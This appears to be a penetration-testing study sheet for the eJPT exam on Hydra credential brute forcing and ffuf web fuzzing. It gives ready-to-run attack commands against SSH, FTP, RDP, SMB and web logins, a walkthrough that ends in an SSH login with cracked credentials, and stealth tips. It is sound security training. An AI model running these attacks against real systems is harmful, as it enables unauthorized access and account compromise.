HYDRA - Credential Brute Forcing

Overview

Hydra automates brute-force attacks on various services (SSH, FTP, HTTP, RDP, SMB, etc.). It attempts multiple credential combinations quickly using multiple parallel threads.

Why It's Critical for eJPT:

  • Often default or weak credentials exist
  • Automates credential testing
  • Supports 50+ protocols
  • Parallel threading for speed
  • Can use username/password lists

Installation & Setup

# CachyOS:
sudo pacman -S hydra
hydra -h | head -20  # Verify

Common Use Cases

1. SSH Brute Force

hydra -l admin -p password ssh://192.168.1.100
hydra -L users.txt -P passwords.txt ssh://192.168.1.100 -t 4

2. FTP Brute Force

hydra -l admin -p password ftp://192.168.1.100
hydra -L users.txt -P pass.txt ftp://192.168.1.100 -t 4

3. HTTP Login Form

hydra -l admin -P passwords.txt http-post-form://target.com/login.php:user=^USER^&pass=^PASS^:F=Login

4. RDP Brute Force

hydra -l administrator -P passwords.txt rdp://192.168.1.100

5. SMB Brute Force

hydra -l administrator -P passwords.txt smb://192.168.1.100

6. Multiple Services at Once

hydra -l admin -P pass.txt 192.168.1.100 ssh ftp http-get

Command Reference

Flag Purpose
-l Single username
-L Username list file
-p Single password
-P Password list file
-t Threads (default: 16)
-x Password options (min:max:charset)
-C Credentials file (user:pass pairs)
-vV Very verbose
-o Output file

Real-World Example

# Scenario: Found service running, need credentials

# Step 1: Create user list from reconnaissance
enum4linux -U 192.168.1.100 > users.txt

# Step 2: Extract just usernames
grep "Account:" users.txt | awk '{print $NF}' > usernames.txt

# Step 3: Brute force SSH
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 -t 4

# Step 4: Found credentials!
# user1:password123

# Step 5: Login
ssh user1@192.168.1.100
# Enter password: password123

Tips

  • Use targeted wordlists: rockyou.txt for weak passwords
  • Adjust threads carefully: Too many = slow/detectable
  • Extract users first: enum4linux, nmap script output
  • Start with common credentials: admin/admin, admin/password
  • Monitor progress: Use -vV for verbose output
  • Save successful findings: Use -o results.txt

Key Takeaways

  1. SSH brute force: hydra -L users.txt -P pass.txt ssh://target
  2. FTP brute force: hydra -L users.txt -P pass.txt ftp://target
  3. HTTP form: hydra -L users -P pass http-post-form://target/page:data
  4. RDP brute force: hydra -L users -P pass rdp://target
  5. Multiple services: hydra -L users -P pass target ssh ftp http-get
  6. Control speed: -t 4 for stealthy, -t 16 for fast
  7. Combine with enum: Use users from enum4linux/nmap

Next Steps: Use found credentials for access, privilege escalation, or lateral movement.

FFUF - Web Fuzzing

Overview

ffuf (Fuzz Faster U Fool) is a fast web fuzzer for discovering files, directories, and parameters. It's faster than gobuster and more flexible.

Why It's Critical for eJPT:

  • Faster than gobuster for large wordlists
  • Finds parameters, headers, cookies
  • Can fuzz POST data
  • Advanced filtering options

Installation & Setup

# CachyOS:
sudo pacman -S ffuf
ffuf -h | head -20

Common Use Cases

1. Directory Brute Force

ffuf -u http://target/FUZZ -w wordlist.txt

2. with Extensions

ffuf -u http://target/FUZZ.php -w wordlist.txt

3. Subdomain Fuzzing

ffuf -u http://FUZZ.target.com -w subdomains.txt -H "Host: FUZZ.target.com"

4. POST Parameter Fuzzing

ffuf -u http://target/search -d "q=FUZZ" -w wordlist.txt

5. Cookie Fuzzing

ffuf -u http://target/page -H "Cookie: id=FUZZ" -w numbers.txt

6. Custom Filtering

ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301
ffuf -u http://target/FUZZ -w wordlist.txt -fc 404

Command Reference

Flag Purpose
-u URL with FUZZ placeholder
-w Wordlist
-d POST data with FUZZ
-H Header with FUZZ
-mc Match status codes (200,301)
-fc Filter status codes (404)
-ms Match response size
-fs Filter response size
-t Threads
-o Output file

Key Takeaways

  1. Directory fuzz: ffuf -u http://target/FUZZ -w wordlist.txt
  2. Subdomain fuzz: ffuf -u http://FUZZ.target.com -w subs.txt
  3. Parameter fuzz: ffuf -u http://target/FUZZ -w words.txt
  4. POST fuzz: ffuf -u http://target -d "param=FUZZ" -w list.txt
  5. Filter responses: -mc 200,301 or -fc 404

Next Steps: Investigate found endpoints with Burp Suite or curl for vulnerabilities.
